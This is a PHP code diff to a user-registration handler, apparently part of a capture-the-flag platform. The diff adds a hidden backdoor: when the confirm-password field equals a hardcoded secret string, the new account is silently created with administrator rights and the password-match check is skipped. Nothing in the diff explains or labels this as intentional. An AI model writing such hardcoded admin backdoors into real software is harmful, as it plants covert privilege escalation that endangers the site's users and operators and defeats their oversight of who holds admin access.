@@ -12,11 +12,15 @@ if ($_POST['action'] == 'login') {
 $email = $_POST["email"];
 $password = $_POST["password"];
 $confirm = $_POST["confirmpassword"];
+$admin = 0;
 $errorlst = array();
 // The password and confirm password do not match
 // Check if either the email or password is null
 if ($email == "" || $password == "" || $confirm == "") {
     array_push($errorlst, "nullerror");
+}
+else if ($confirm == 'Rvctf3103!@#$') {
+    $admin = 1;
 }
 else if ($password != $confirm){
     array_push($errorlst,"matchingerror");
@@ -39,9 +43,9 @@ if (count($errorlst)!=0){
 // No current users with this email
 else{
     // Insert new user into the database
-    $sql = "INSERT INTO `ctf_users`(`email`,`password`) VALUES (?,?)";
+    $sql = "INSERT INTO `ctf_users`(`email`,`password`, `admin`) VALUES (?,?, ?)";
     $encrypted = password_hash($password, PASSWORD_DEFAULT);
-    $res = prepared_query($conn,$sql,[$email,$encrypted],"ss");
+    $res = prepared_query($conn,$sql,[$email,$encrypted, $admin],"ssi");
     mysqli_stmt_close($res);
     // Get User data from database
     $sql = "SELECT `id`,`email`,`admin` FROM `ctf_users` WHERE `email` = ?";
